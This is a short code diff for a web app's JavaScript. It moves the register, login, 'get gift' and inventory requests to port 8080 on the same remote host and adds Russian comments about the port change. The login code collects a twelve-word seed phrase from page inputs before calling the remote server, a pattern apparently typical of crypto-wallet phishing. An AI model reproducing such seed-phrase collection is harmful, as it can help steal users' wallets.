@@ -1,5 +1,4 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // Your existing DOMContentLoaded code
     checkUser();  // Load user data when the page is loaded
 });
 
@@ -25,7 +24,7 @@ function checkUser() {
 
 async function register() {
     try {
-        const response = await fetch('https://sitecheck.yhub.net/register', {
+        const response = await fetch('https://sitecheck.yhub.net:8080/register', {  // Обновите порт
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -48,6 +47,8 @@ async function register() {
     }
 }
 
+// Обновите все остальные запросы аналогичным образом
+
 async function login() {
     const seedWords = Array.from({ length: 12 }, (_, i) => document.getElementById(`seed_word_${i + 1}`).value.trim());
     const seed = seedWords.join(' ');
@@ -58,7 +59,7 @@ async function login() {
     }
 
     try {
-        const response = await fetch('https://sitecheck.yhub.net/login', {
+        const response = await fetch('https://sitecheck.yhub.net:8080/login', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -90,7 +91,7 @@ async function getGift() {
     }
 
     try {
-        const response = await fetch('https://sitecheck.yhub.net/get_gift', {
+        const response = await fetch('https://sitecheck.yhub.net:8080/get_gift', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -139,7 +140,7 @@ async function showInventory() {
     }
 
     try {
-        const response = await fetch('https://sitecheck.yhub.net/inventory', {
+        const response = await fetch('https://sitecheck.yhub.net:8080/inventory', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
